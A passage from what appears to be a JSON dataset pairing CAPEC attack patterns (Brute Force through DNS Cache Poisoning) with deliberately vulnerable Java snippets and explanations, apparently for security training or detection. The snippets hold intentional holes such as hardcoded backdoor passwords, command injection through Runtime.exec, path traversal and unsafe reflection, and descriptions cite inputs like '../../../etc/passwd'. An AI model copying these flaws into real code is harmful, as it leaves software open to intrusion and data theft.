        "code_snippet": "public class ApiController {\n    @RestController\n    public class JsonDataController {\n        @GetMapping(\"/api/userdata\")\n        public ResponseEntity<String> getUserData(@RequestParam String callback) {\n            String sensitiveData = \"{\\\"userId\\\":123,\\\"creditCard\\\":\\\"4111-1111-1111-1111\\\"}\";\n            \n            // Vulnerable JSONP endpoint that doesn't validate origin\n            String jsonpResponse = callback + \"(\" + sensitiveData + \")\";\n            \n            // No CSRF protection\n            // No origin validation\n            // Returns raw JSONP without content type validation\n            return ResponseEntity.ok()\n                    .header(\"Access-Control-Allow-Origin\", \"*\")\n                    .body(jsonpResponse);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable JSONP endpoint that allows cross-domain data theft. It contains multiple security issues: no origin validation, lack of CSRF protection, and unsafe handling of callback parameters. The endpoint returns sensitive data wrapped in a JSONP callback without proper security controls, allowing attackers to bypass Same Origin Policy through script inclusion attacks."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "public class SimpleAuth {\n    private static final String WEAK_SALT = \"123\";\n    private static final int MAX_LENGTH = 6;\n    \n    public static boolean login(String username, String password) {\n        String storedHash = \"5f4dcc3b5aa765d61d8327deb882cf99\"; // 'password' in MD5\n        String hashedInput = md5(password + WEAK_SALT);\n        return hashedInput.equals(storedHash);\n    }\n    \n    public static String generateToken() {\n        Random random = new Random();\n        StringBuilder token = new StringBuilder();\n        for(int i = 0; i < MAX_LENGTH; i++) {\n            token.append(random.nextInt(10));\n        }\n        return token.toString();\n    }\n    \n    public static boolean verifyAccessCode(String code) {\n        String validCode = \"123456\";\n        return code.equals(validCode);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security weaknesses including use of: weak password storage (MD5 with simple salt), predictable token generation (non-cryptographic Random), fixed short access code, no brute force protection, and direct string comparison for authentication. The code allows for easy brute force attempts against both the login and access code verification."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "public class DeviceController {\n    private static final int CONTROL_REG = 0x1000;\n    private static final int DEBUG_REG = 0x2000;\n    \n    public void configureDevice(int value) {\n        // Direct memory-mapped I/O without access checks\n        writeToRegister(CONTROL_REG, value);\n    }\n    \n    public void enableDebugMode() {\n        // No authentication check for debug mode activation\n        writeToRegister(DEBUG_REG, 0xFF);\n    }\n    \n    private native void writeToRegister(int address, int value);\n    \n    public int handleIOCTL(int code, byte[] data) {\n        // No privilege check for IOCTL operations\n        switch(code) {\n            case 0x01:\n                return modifyHardwareState(data);\n            case 0x02:\n                return accessSecureRegisters(data);\n            default:\n                return -1;\n        }\n    }\n    \n    private int modifyHardwareState(byte[] data) {\n        // Direct hardware state modification without validation\n        return performHardwareOperation(data);\n    }\n    \n    private int accessSecureRegisters(byte[] data) {\n        // Unprotected access to sensitive hardware registers\n        return readWriteRegisters(data);\n    }\n    \n    private native int performHardwareOperation(byte[] data);\n    private native int readWriteRegisters(byte[] data);\n}",
        "description": "This code demonstrates various hardware interface vulnerabilities including unprotected register access, lack of access control for IOCTLs, and exposed debug functionality. The code allows direct memory-mapped I/O operations without proper access controls, enables debug features without authentication, and processes IOCTL commands without checking privileges. It also lacks proper validation for hardware state modifications and secure register access, making it susceptible to interface manipulation attacks."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "public class AuthenticationService {\n    private static int loginAttempts = 0;\n    private static final String HARDCODED_DEBUG_KEY = \"debug123\";\n    \n    public boolean authenticate(String username, String password) {\n        // Debug backdoor - allows access with debug key regardless of credentials\n        if (password.equals(HARDCODED_DEBUG_KEY)) {\n            return true;\n        }\n        \n        // No rate limiting on login attempts\n        loginAttempts++;\n        \n        // Weak authentication - simple string comparison\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        }\n        \n        // Insufficient validation of authentication token\n        if (password.startsWith(\"token_\")) {\n            return validateTokenFormat(password);\n        }\n        \n        return false;\n    }\n    \n    private boolean validateTokenFormat(String token) {\n        // Only checks if token has correct length, no cryptographic validation\n        return token.length() == 32;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses including a hardcoded debug backdoor, lack of brute force protection, weak credential validation, and insufficient token validation. The authentication can be bypassed through the debug key, unlimited login attempts, or by providing a token with correct length but no cryptographic verification."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "public class AuthenticationService {\n    private static boolean isAdmin = false;\n    \n    public static boolean login(String username, String password) {\n        // Vulnerable: Using static flag for authentication state\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            isAdmin = true;\n            return true;\n        }\n        return false;\n    }\n    \n    public static boolean checkAccess() {\n        // Vulnerable: Authentication state can be modified externally\n        return isAdmin;\n    }\n    \n    public static void accessSecureResource() {\n        // Vulnerable: Alternative path that doesn't verify authentication\n        if (System.getProperty(\"debug\").equals(\"true\")) {\n            // Debug backdoor bypasses authentication\n            isAdmin = true;\n        }\n        \n        if (isAdmin) {\n            // Access granted to secure resource\n            System.out.println(\"Accessing secure resource...\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication bypass flaws: using mutable static state for authentication, a debug backdoor providing an alternate authentication path, and insufficient verification of authentication state. The authentication state can be manipulated externally, and the debug mode provides an authentication bypass channel."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "public class SystemProber {\n    public String probeSystemInfo() {\n        StringBuilder info = new StringBuilder();\n        String userHome = System.getProperty(\"user.home\");\n        String classPath = System.getProperty(\"java.class.path\");\n        \n        // Search for sensitive files in user-controlled paths\n        File searchDir = new File(userHome + File.separator + \"config\");\n        if (searchDir.exists()) {\n            for (File file : searchDir.listFiles()) {\n                try {\n                    BufferedReader reader = new BufferedReader(new FileReader(file));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        info.append(line);\n                    }\n                    reader.close();\n                } catch (IOException e) {}\n            }\n        }\n        \n        // Expose system information\n        info.append(System.getProperties().toString());\n        info.append(System.getenv());\n        \n        // Create debug log with sensitive information\n        File debugLog = new File(\"debug.log\");\n        try {\n            FileWriter writer = new FileWriter(debugLog);\n            writer.write(info.toString());\n            writer.close();\n        } catch (IOException e) {}\n        \n        return info.toString();\n    }\n}",
        "description": "This vulnerable code actively probes the system for sensitive information, including system properties, environment variables, and user files. It creates an emergent resource (debug log) containing sensitive data, searches through user-controlled paths without proper validation, and exposes collected information without authorization checks. The code demonstrates information exposure vulnerabilities by gathering and storing sensitive system data in an insecure manner."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "public class SensitiveDataTransmitter {\n    private Socket socket;\n    private PrintWriter out;\n\n    public void transmitSensitiveData(String username, String password, String creditCardNumber) {\n        try {\n            socket = new Socket(\"banking.example.com\", 8080);\n            out = new PrintWriter(socket.getOutputStream(), true);\n\n            // Transmitting sensitive data in cleartext\n            String data = \"username=\" + username + \"&password=\" + password + \"&ccnum=\" + creditCardNumber;\n            out.println(data);\n\n            // No message integrity checks\n            out.println(\"TRANSACTION_COMPLETE\");\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendLargeVolume(String message) {\n        try {\n            // No rate limiting or volume control\n            while(true) {\n                out.println(message);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates cleartext transmission of sensitive data (CWE-319), lack of message integrity checks (CWE-924), and uncontrolled network message volume (CWE-406). The code transmits sensitive information like username, password, and credit card numbers without encryption, making it susceptible to network sniffing attacks. It also lacks any message integrity verification and implements no controls on the volume of network messages that can be sent."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "public class URLFilter {\n    public static boolean isUrlSafe(String input) {\n        // Basic filter that only checks for single-encoded dangerous characters\n        String[] blockedPatterns = {\"%2E\", \"%2F\", \"%5C\"};\n        \n        for (String pattern : blockedPatterns) {\n            if (input.contains(pattern)) {\n                return false;\n            }\n        }\n        \n        // Vulnerable: Doesn't check for double encoding\n        // %252E (double-encoded '.') will pass through\n        return true;\n    }\n    \n    public static void processUrl(String url) {\n        if (isUrlSafe(url)) {\n            // Vulnerable: processes URL without proper decoding checks\n            java.io.File file = new java.io.File(java.net.URLDecoder.decode(url));\n            // Process file...\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of double URL encoding. The filter only checks for single-encoded dangerous characters like %2E (.), but fails to detect double-encoded versions like %252E. This allows an attacker to bypass the security filter using double encoding, potentially leading to path traversal or injection attacks. The code also performs validation before proper filtering and uses an incomplete denylist of blocked patterns."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private static final boolean DEBUG_MODE = true;\n    private static String debugPassword = \"debug123\";\n\n    public class SecurityToken {\n        public String id;\n        public boolean isAdmin;\n        public boolean isDebugEnabled;\n    }\n\n    public void processRequest(String command, SecurityToken token) {\n        if (DEBUG_MODE) {\n            System.out.println(\"Debug: Processing request with user credentials: \" + token.id);\n            System.out.println(\"Debug: System memory state: \" + Runtime.getRuntime().freeMemory());\n        }\n\n        if (command.startsWith(\"DEBUG:\")) {\n            if (command.contains(debugPassword)) {\n                enableDebugFeatures(token);\n                System.out.println(\"Debug mode activated - Full system access granted\");\n                executeDebugCommand(command.substring(6));\n            }\n        }\n    }\n\n    private void enableDebugFeatures(SecurityToken token) {\n        token.isAdmin = true;\n        token.isDebugEnabled = true;\n    }\n\n    private void executeDebugCommand(String command) {\n        // Execute potentially dangerous debug commands\n        Runtime.getRuntime().exec(command);\n    }\n}",
        "description": "This vulnerable code demonstrates a production system with enabled debug functionality that can be exploited. It includes hard-coded debug credentials, reveals sensitive information in debug messages, and allows runtime activation of debug features that can compromise system security. The security token implementation is flawed, allowing unauthorized elevation of privileges through debug interfaces."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class AdminPortal {\n    private static boolean isLoggedIn = false;\n\n    public static void main(String[] args) {\n        UserSession session = new UserSession(\"regular_user\");\n        displaySensitiveData(session);\n        modifySystemSettings(session);\n    }\n\n    public static void displaySensitiveData(UserSession session) {\n        // No proper privilege check, any user can access sensitive data\n        System.out.println(\"Bank Account Numbers: 1234-5678-9012\");\n        System.out.println(\"Social Security Numbers: 123-45-6789\");\n    }\n\n    public static void modifySystemSettings(UserSession session) {\n        // Critical system modifications without proper privilege verification\n        DatabaseConfig.setConnectionString(\"new_connection_string\");\n        SecuritySettings.disableFirewall();\n    }\n\n    static class UserSession {\n        private String userType;\n        \n        public UserSession(String userType) {\n            this.userType = userType;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper privilege management where sensitive operations and data are accessible to all users without proper access control checks. The code allows any user to access sensitive data and modify critical system settings without verifying their privileges or role, violating the principle of least privilege."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class VulnerableBufferAccess {\n    private byte[] buffer = new byte[10];\n\n    public void copyData(byte[] source, int offset) {\n        // No bounds checking on offset or source length\n        for(int i = 0; i < source.length; i++) {\n            buffer[offset + i] = source[i];\n        }\n    }\n\n    public byte[] readData(int start, int length) {\n        // No validation of start or length parameters\n        byte[] result = new byte[length];\n        System.arraycopy(buffer, start, result, 0, length);\n        return result;\n    }\n}",
        "description": "This code demonstrates vulnerable buffer access through a class that manages a fixed-size buffer without proper bounds checking. The copyData method allows writing beyond buffer bounds by not validating the offset and source length. The readData method permits buffer under-read and over-read by not validating start and length parameters against buffer size."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "public class SharedResourceExample {\n    private static int sharedCounter = 0;\n    private static byte[] sharedBuffer = new byte[1024];\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> {\n            while (true) {\n                // Unsynchronized access to shared counter\n                sharedCounter++;\n                // Unsynchronized write to shared buffer\n                sharedBuffer[sharedCounter % 1024] = (byte) (Math.random() * 255);\n            }\n        });\n\n        Thread thread2 = new Thread(() -> {\n            while (true) {\n                // Read and use potentially corrupted data\n                int value = sharedCounter;\n                byte data = sharedBuffer[value % 1024];\n                processData(data);\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n\n    private static void processData(byte data) {\n        // Process potentially corrupted data\n        System.out.println(data);\n    }\n}",
        "description": "This vulnerable code demonstrates improper synchronization of shared resources between multiple threads. It features a shared counter and buffer that are accessed without proper synchronization mechanisms, leading to race conditions and potential data corruption. The code allows one thread to modify shared resources while another thread simultaneously reads from them, creating a scenario where data integrity cannot be guaranteed and potentially exposing sensitive information through shared microarchitectural structures."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "public class ResourceServer {\n    private static final ExecutorService executor = Executors.newFixedThreadPool(100);\n    \n    public void handleRequest(HttpServletRequest request) {\n        // No rate limiting or request validation\n        while (true) {\n            executor.submit(() -> {\n                try {\n                    // Open a file resource for each request without limits\n                    FileInputStream fis = new FileInputStream(\"largeFile.txt\");\n                    byte[] buffer = new byte[8192];\n                    \n                    // Keep the stream open and buffer in memory\n                    while (fis.read(buffer) != -1) {\n                        // Process data without timeout or size checks\n                        Thread.sleep(100);\n                    }\n                    \n                    // Resource never properly closed\n                } catch (Exception e) {\n                    // Silently ignore exceptions\n                }\n            });\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple resource management issues: it accepts unlimited concurrent requests without rate limiting, creates new threads for each request without bounds, opens file resources without proper closure, and maintains connections indefinitely. This makes it susceptible to resource exhaustion through flooding attacks, as attackers can overwhelm the server by rapidly sending multiple requests."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "public class FileDownloader {\n    private static final String BASE_PATH = \"/var/www/files/\";\n    \n    public void downloadFile(String fileName) {\n        try {\n            String filePath = BASE_PATH + fileName;\n            File file = new File(filePath);\n            FileInputStream fis = new FileInputStream(file);\n            \n            // Read and send file content\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                // Send bytes to output stream\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input (fileName) with a base path without proper validation. An attacker could provide input like '../../../etc/passwd' to access files outside the intended directory. The code lacks proper path canonicalization and fails to validate that the final path remains within the intended directory structure."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "public class FileExplorer {\n    public void listDirectoryContents(HttpServletRequest request, HttpServletResponse response) {\n        String requestedPath = request.getParameter(\"path\");\n        File directory = new File(\"/var/www/\" + requestedPath);\n        \n        if(directory.isDirectory()) {\n            File[] files = directory.listFiles();\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            \n            out.println(\"<html><body>\");\n            for(File file : files) {\n                out.println(\"<a href='?path=\" + requestedPath + \"/\" + file.getName() + \"'>\" \n                    + file.getName() + \"</a><br>\");\n            }\n            out.println(\"</body></html>\");\n        }\n    }\n}",
        "description": "This vulnerable code allows directory listing without proper authentication or authorization checks. It accepts a path parameter from user input and directly uses it to list directory contents, potentially exposing sensitive files and directories. The code lacks input validation, permission checks, and authentication verification, making it susceptible to directory traversal and unauthorized access."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class PaymentProcessor {\n    private int balance = 1000;\n\n    public boolean processPayment(int amount1, int amount2) {\n        int totalAmount = amount1 + amount2;  // Potential integer overflow\n        \n        if (totalAmount <= balance) {  // No minimum check\n            balance -= totalAmount;\n            return true;\n        }\n        return false;\n    }\n\n    public boolean transferFunds(short smallAmount) {\n        int convertedAmount = smallAmount;  // Potential sign extension\n        \n        if (convertedAmount > 0) {\n            return processPayment(convertedAmount, 100);\n        }\n        return false;\n    }\n}",
        "description": "This code demonstrates multiple integer-related vulnerabilities: potential integer overflow in payment addition, missing minimum value check in comparison, and possible sign extension when converting from short to int. An attacker could exploit these by providing carefully crafted values that cause unexpected negative numbers or integer wraparound, potentially bypassing payment limits or causing incorrect balance calculations."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class UnsafePointerDemo {\n    public static void main(String[] args) {\n        int[] buffer = new int[10];\n        int offset = Integer.parseInt(args[0]);\n        \n        // Unsafe pointer arithmetic and array access\n        try {\n            int value = buffer[offset];\n            System.out.println(\"Value at offset: \" + value);\n            \n            // Potential null pointer dereference\n            String str = null;\n            if(offset > 5) {\n                str = \"test\";\n            }\n            System.out.println(str.length());\n        } catch(Exception e) {\n            System.err.println(\"Error accessing memory\");\n        }\n    }\n}",
        "description": "This code demonstrates multiple pointer-related vulnerabilities: it performs unsafe array access with an untrusted offset from command line arguments (CWE-119), potentially causing out-of-bounds memory access. It also includes a null pointer dereference vulnerability (CWE-476) where a null string reference might be dereferenced based on the input value."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "public class ResourceLeakExample {\n    private List<byte[]> dataStore = new ArrayList<>();\n\n    public void processRequest(String input) {\n        while (true) {\n            // Allocate large chunks of memory without limits\n            byte[] largeArray = new byte[1000000];\n            dataStore.add(largeArray);\n\n            // Process input without proper resource cleanup\n            try {\n                BufferedReader reader = new BufferedReader(new FileReader(input));\n                // Reader is never closed, leading to resource leak\n                String line = reader.readLine();\n                \n                // Create threads without limit\n                new Thread(() -> {\n                    try {\n                        Thread.sleep(10000);\n                    } catch (InterruptedException e) {}\n                }).start();\n            } catch (IOException e) {\n                // Exception handling without resource cleanup\n                continue;\n            }\n        }\n    }\n}",
        "description": "This code demonstrates multiple resource-related vulnerabilities: unbounded memory allocation, unclosed file handlers, unlimited thread creation, and lack of resource cleanup. The processRequest method continuously allocates memory and creates new threads without any limits or proper cleanup, leading to resource exhaustion. It also leaves file resources open, causing resource leaks."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "public class ResourceLeakExample {\n    private static final int MAX_CONNECTIONS = 100;\n    private List<FileInputStream> fileStreams = new ArrayList<>();\n    \n    public void processFiles(String[] filePaths) {\n        try {\n            for (String path : filePaths) {\n                FileInputStream fis = new FileInputStream(path);\n                fileStreams.add(fis);\n                // Process file without closing the stream\n                processData(fis);\n                // Stream is never closed and stays in the list\n            }\n        } catch (IOException e) {\n            // Exception handling without resource cleanup\n        }\n    }\n    \n    private void processData(FileInputStream fis) throws IOException {\n        // Processing logic\n        byte[] buffer = new byte[8192];\n        while (fis.read(buffer) != -1) {\n            // Process buffer without releasing resources\n        }\n    }\n}",
        "description": "This code demonstrates a resource leak vulnerability where FileInputStream objects are created and stored in a list but never properly closed. Each time processFiles is called, it creates new file handles that remain open, eventually leading to resource exhaustion. The lack of proper resource cleanup in both normal execution and exception handling paths can cause the system to run out of file handles, making it unavailable for legitimate requests."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "public class FileProcessor {\n    public void processUserFile(String fileName) {\n        File file = new File(\"/user/data/\" + fileName);\n        \n        if(file.exists()) {\n            try {\n                // Sleep to simulate some processing time\n                Thread.sleep(100);\n                \n                // Process the file without checking if it's still the same file\n                FileInputStream fis = new FileInputStream(file);\n                byte[] data = new byte[1024];\n                fis.read(data);\n                fis.close();\n                \n                // Process data...\n                processData(data);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    private void processData(byte[] data) {\n        // Process the file data\n    }\n}",
        "description": "This vulnerable code accepts a filename parameter and attempts to process a file without properly handling symbolic links or verifying the file's identity between checks. It contains a TOCTOU (Time of Check to Time of Use) race condition vulnerability where an attacker could replace the legitimate file with a symbolic link between the existence check and actual file access. The code also doesn't validate the user input filename or resolve symbolic links securely, making it susceptible to symlink attacks."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "public class AdminConsole {\n    private static final String ADMIN_PASSWORD = \"s3cr3t\";\n    private boolean isDebugMode = false;\n\n    public void processCommand(String command) {\n        try {\n            if (command.startsWith(\"--\")) {\n                switch (command) {\n                    case \"--help\":\n                        showHelp();\n                        break;\n                    case \"--debug\":\n                        isDebugMode = true;\n                        printDebugInfo();\n                        break;\n                    case \"--secret\":\n                        // Hidden, undocumented command\n                        System.out.println(\"Admin password: \" + ADMIN_PASSWORD);\n                        break;\n                    case \"--backup\":\n                        // Incomplete input validation\n                        performBackup();\n                        break;\n                }\n            }\n        } catch (Exception e) {\n            // Silently ignore errors\n        }\n    }\n\n    private void printDebugInfo() {\n        if (isDebugMode) {\n            System.out.println(\"Debug mode enabled\");\n            System.out.println(\"System configuration: \" + System.getProperties());\n            System.out.println(\"Environment variables: \" + System.getenv());\n        }\n    }\n\n    private void performBackup() {\n        // Direct access to deep layer functionality without proper checks\n        DatabaseConnection.getInstance().dumpAllData();\n    }\n}",
        "description": "This vulnerable code demonstrates an application with hidden functionality and debug options that can be discovered through command-line parameter fuzzing. It includes undocumented commands (CWE-912), incomplete input validation (CWE-184), unchecked error conditions (CWE-391), excessive debug information disclosure (CWE-1296), and improper architectural layering (CWE-1054). The code exposes sensitive information through debug commands and contains hidden functionality that could be discovered through parameter fuzzing."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "public class EmailHeaderInjector {\n    public void sendEmail(String recipient, String subject, String userInput) {\n        try {\n            String emailHeaders = \"To: \" + recipient + \"\\r\\n\" +\n                                \"Subject: \" + subject + \"\\r\\n\" +\n                                \"X-Custom-Header: \" + userInput + \"\\r\\n\";\n            \n            // Construct email message without sanitizing user input\n            String rawEmail = emailHeaders + \"\\r\\n\" + \n                            \"Hello, this is the email body\";\n            \n            // Send email using raw SMTP connection\n            Socket smtpSocket = new Socket(\"smtp.server.com\", 25);\n            PrintWriter out = new PrintWriter(smtpSocket.getOutputStream());\n            out.println(rawEmail);\n            out.flush();\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates email header injection by directly incorporating unsanitized user input into email headers. The code fails to neutralize special characters like CRLF (\\r\\n) which could allow an attacker to inject additional headers or split the email message. An attacker could provide input containing \\r\\n sequences to add malicious headers or manipulate the email structure."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "public class FormatStringVulnerability {\n    public static void main(String[] args) {\n        String userInput = getUserInput();\n        // Vulnerable: directly using user input as format string\n        System.out.printf(userInput);\n        \n        // Format string log vulnerability\n        String logMessage = String.format(userInput, \"sensitive\", 42, new Object());\n        Logger.getLogger(\"app\").info(logMessage);\n        \n        // Vulnerable custom formatter\n        CustomFormatter formatter = new CustomFormatter();\n        formatter.format(userInput, new Object[]{\"data\", 123});\n    }\n    \n    private static String getUserInput() {\n        Scanner scanner = new Scanner(System.in);\n        return scanner.nextLine();\n    }\n}",
        "description": "This code demonstrates format string vulnerabilities by directly using unvalidated user input as format strings in printf, String.format, and custom formatting operations. An attacker could input malicious format specifiers like %s or %n to potentially read sensitive memory content or cause buffer overflows."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "public boolean authenticateUser(String username) {\n    try {\n        DirContext ctx = new InitialDirContext(env);\n        String searchFilter = \"(&(objectClass=user)(uid=\" + username + \"))\";\n        SearchControls searchControls = new SearchControls();\n        searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n        NamingEnumeration<SearchResult> results = ctx.search(\"dc=example,dc=com\",\n                searchFilter, searchControls);\n        return results.hasMore();\n    } catch (NamingException e) {\n        return false;\n    }\n}",
        "description": "This vulnerable code performs LDAP authentication by directly concatenating user input into an LDAP search filter without any input validation or sanitization. An attacker can inject special characters like * or & to manipulate the LDAP query and potentially bypass authentication or extract unauthorized information from the directory."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String userInput = request.getParameter(\"command\");\n            String command = \"cmd.exe /c dir \" + userInput;\n            \n            ProcessBuilder pb = new ProcessBuilder(command);\n            Process process = pb.start();\n            \n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable servlet that processes user input from a GET request parameter without proper sanitization. The code directly concatenates user input into a command string, allowing parameter injection and command injection attacks. It uses GET method with sensitive command parameters and fails to properly encode or escape the input, making it vulnerable to argument delimiter manipulation."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "public class ReflectionHandler {\n    public Object loadAndInvokeClass(String className, String methodName, String parameter) {\n        try {\n            Class<?> dynamicClass = Class.forName(className);\n            Object instance = dynamicClass.newInstance();\n            Method method = dynamicClass.getMethod(methodName, String.class);\n            return method.invoke(instance, parameter);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public static void main(String[] args) {\n        String userClassName = request.getParameter(\"class\");\n        String userMethodName = request.getParameter(\"method\");\n        String userInput = request.getParameter(\"input\");\n        \n        ReflectionHandler handler = new ReflectionHandler();\n        handler.loadAndInvokeClass(userClassName, userMethodName, userInput);\n    }\n}",
        "description": "This code demonstrates unsafe reflection by allowing user input to directly control class loading and method invocation without any validation or sanitization. An attacker could provide malicious class names or method names to execute arbitrary code or access sensitive information through reflection."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "public class FileDownloader {\n    private static final String BASE_PATH = \"/var/www/files/\";\n    \n    public void downloadFile(String userInput) {\n        String filePath = BASE_PATH + userInput;\n        try {\n            FileInputStream fis = new FileInputStream(filePath);\n            // Process file download\n            byte[] buffer = new byte[4096];\n            while (fis.read(buffer) != -1) {\n                // Send buffer to output stream\n            }\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code is vulnerable to path traversal attacks as it directly concatenates user input to a base path without proper validation. An attacker could provide inputs like '../../../etc/passwd' to access files outside the intended directory structure. The code lacks proper input sanitization and path canonicalization checks, making it susceptible to all variants of path traversal attacks including '../', '..../', and similar patterns."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "public class OrderFormProcessor {\n    private Map<String, String> formData = new HashMap<>();\n    private boolean step1Complete = false;\n    private boolean step2Complete = false;\n\n    @RequestMapping(\"/process-form/{stepNumber}\")\n    public String processForm(@PathVariable String stepNumber,\n                            @RequestParam Map<String, String> formInputs,\n                            @RequestParam String formName) {\n        // Vulnerable: No proper state validation\n        if(formName.equals(\"step3Form\")) {\n            saveOrderData(formInputs);\n            return \"success\";\n        }\n\n        // Vulnerable: Relies on client-side state tracking\n        formData.putAll(formInputs);\n        if(stepNumber.equals(\"1\")) {\n            step1Complete = true;\n        } else if(stepNumber.equals(\"2\")) {\n            step2Complete = true;\n        }\n\n        return \"redirect:/form/\" + (Integer.parseInt(stepNumber) + 1);\n    }\n\n    private void saveOrderData(Map<String, String> formInputs) {\n        // Vulnerable: No verification of previous steps completion\n        // No CSRF protection\n        // No verification of data consistency\n        Database.saveOrder(formInputs);\n    }\n}",
        "description": "This code demonstrates a vulnerable multi-step form processing implementation where an attacker can bypass the form sequence by directly accessing later steps. The code lacks proper state validation, relies on client-controlled parameters, and doesn't implement CSRF protection. It also fails to verify the completion of previous steps before processing later steps, making it vulnerable to form sequence bypassing."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "public class WebBrowser {\n    private static Map<String, String> dnsCache = new HashMap<>();\n    \n    public static String resolveDomain(String domain) {\n        // Check if domain is in cache first\n        if (dnsCache.containsKey(domain)) {\n            return dnsCache.get(domain);\n        }\n        \n        // Simulating DNS lookup without proper validation\n        String ip = dnsLookup(domain);\n        // Storing in cache without verifying authenticity\n        dnsCache.put(domain, ip);\n        return ip;\n    }\n    \n    private static String dnsLookup(String domain) {\n        // Vulnerable: accepts any response without validation\n        try {\n            InetAddress address = InetAddress.getByName(domain);\n            return address.getHostAddress();\n        } catch (Exception e) {\n            return \"0.0.0.0\";\n        }\n    }\n    \n    public static void main(String[] args) {\n        // Attacker could poison cache with malicious IP\n        String ip = resolveDomain(\"bank.com\");\n        System.out.println(\"Resolved IP: \" + ip);\n    }\n}",
        "description": "This code demonstrates a vulnerable DNS cache implementation where domain resolutions are cached without proper verification of authenticity. The cache can be poisoned by an attacker who could provide malicious DNS responses, which would then be stored and reused without validation. The code lacks origin validation, accepts untrusted data without verification, and stores sensitive information in an insecure cache that could be manipulated by attackers."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "public class DNSResolver {\n    public String resolveHostname(String domainName) {\n        try {\n            // Vulnerable DNS resolution without validation\n            InetAddress addr = InetAddress.getByName(domainName);\n            \n            // Insecure reverse DNS lookup without verification\n            String hostname = addr.getHostName();\n            String ipAddress = addr.getHostAddress();\n            \n            // No verification if hostname matches original domain\n            // No checking of DNS response authenticity\n            // Blindly trust the DNS response\n            \n            return ipAddress;\n        } catch (UnknownHostException e) {\n            return null;\n        }\n    }\n    \n    public boolean isValidDomain(String domainName, String ipAddress) {\n        try {\n            // Vulnerable: relies solely on reverse DNS without verification\n            InetAddress addr = InetAddress.getByAddress(ipAddress.getBytes());\n            String reverseDNS = addr.getCanonicalHostName();\n            \n            // Accepts any response without validating authenticity\n            return reverseDNS.contains(domainName);\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
